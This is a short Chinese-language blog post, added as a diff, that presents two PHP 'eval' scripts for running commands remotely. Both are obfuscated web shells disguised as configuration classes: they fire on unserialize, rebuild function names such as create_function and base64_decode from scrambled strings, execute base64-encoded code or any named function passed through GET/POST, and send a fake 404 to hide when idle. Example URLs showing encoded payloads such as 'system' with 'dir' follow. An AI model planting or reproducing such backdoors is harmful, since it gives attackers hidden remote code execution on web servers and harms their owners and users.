@@ -1,0 +1,85 @@
+---
+author: ww
+comments: true
+date: 2015-11-26 01:38:42+00:00
+layout: post
+link: http://www.gl6.cc/blog/php-eval-%e8%84%9a%e6%9c%ac.html
+slug: php-eval-%e8%84%9a%e6%9c%ac
+title: php eval 脚本
+wordpress_id: 307
+categories:
+- PHP
+tags:
+- eval
+---
+
+## 能运行php命令的脚本
+
+
+ 
+
+    
+    <?php
+    class system_config_ctwj{
+    	function __wakeUp()
+    	{	
+    		$wake_key = 'cmd';
+    		$notfound = "HTTP/1.1 404 Not Found";
+    		if ( isset($_GET[$wake_key]) ) $run_config=$_GET[$wake_key];
+    		if ( isset($_POST[$wake_key]) ) $run_config=$_POST[$wake_key];
+    		if (isset($run_config)){
+    			$this->run($run_config);
+    		} else {
+    			header($notfound);
+    		}
+    	}
+    	function run($para)
+    	{
+    		$ctwj = str_replace("uh","","cuhruheateuh_uhfuhuuhnctuhiuhouhn");
+    		$ctbd = str_replace("x", "", "bxase6x4_dxexcodxe");
+    		$config_all = $ctwj('', $ctbd($para));
+    		$config_all();
+    	}
+    }
+    unserialize('O:18:"system_config_ctwj":0:{}');
+
+
+http://localhost/bug.php?cmd=cGhwaW5mbygpOw==
+将php语句进行base64编码，传入能直接运行。
+
+ 
+
+## 能指定函数名和参数的脚本(eval除外，只接受一个参数)
+
+
+
+    
+    <?php
+    class config{
+    	private $config = 'cmd';
+    	private $notfound = "HTTP/1.1 404 Not Found";
+    	function __wakeUp()
+    	{	if ( isset($_GET['ctwj']) ) header($this->notfound);
+    		if ( isset($_GET[$this->config]) ) $run_config=$_GET[$this->config];
+    		if ( isset($_POST[$this->config]) ) $run_config=$_POST[$this->config];
+    		if (isset($run_config)){
+    			$this->run(base64_decode($run_config));
+    		} else {
+    			header($this->notfound);
+    		}
+    	}
+    	function run($para)
+    	{
+    		$fun = base64_decode($_GET['ctwj']);
+    		$_config = function($config) use ($fun){
+    			$rf = new ReflectionFunction($fun);
+    			$rf->invoke($config);
+    		};
+    		$_config($para);
+    	}
+    }
+    unserialize('O:6:"config":0:{}');
+
+
+http://localhost/bug1.php?ctwj=c3lzdGVt&cmd=ZGly
+将函数名和参数都进行base64编码，传入
